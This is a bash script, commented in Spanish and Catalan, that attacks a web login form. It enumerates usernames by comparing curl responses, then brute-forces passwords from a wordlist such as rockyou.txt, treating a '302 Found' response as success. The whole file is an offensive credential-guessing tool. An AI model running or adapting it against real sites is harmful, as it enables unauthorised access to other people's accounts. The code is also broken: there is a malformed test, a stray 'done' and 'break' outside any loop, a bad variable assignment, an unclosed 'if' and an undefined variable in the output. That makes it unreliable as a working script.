#!/bin/bash
function ataque_diccionario() {
start=1
URL=$(echo -e "$url")
echo "Dime un usuario o un fichero txt con un listado de usuarios"
read document
#añadir a.txt

if [ -f  $document ]
then
    echo "Recuerda que este proceso puede tardar minutos."
    total=$(wc -l < $document)
    while [ $start -le $total ]
        do
        test=$(awk "NR==$start{print $1}" $document)
        if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            echo -e "El usuario és $test"
            username=$test
            break 1
        fi
        ((start = start + 1))
    #    echo $start
    done
else
    if [[! $(curl -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            echo -e "username is $document"
            username=$test
            break 1
        else
            echo "username incorrecto."
        fi
        ((start = start + 1))
    #    echo $start
    done
fi

echo "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta."
read document
if [ -f  $document ] 
then
    echo "Fichero valido"
else
    echo "El Fichero no es valido, usaremos un diccionario propio"
    
    #añadir rockyou.txt
    
    document= b.txt
start=1
total=$(wc -l < $document)
while [ $start -le $total ]
    do
    test=$(awk "NR==$start{print $1}" $document)
    if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
    then
        echo -e "La contrasenya és $test"
        password=$test
        break 1
    fi
    ((start = start + 1))
done
echo -e "L'usuari es $usuari y la seva password es $password"
}
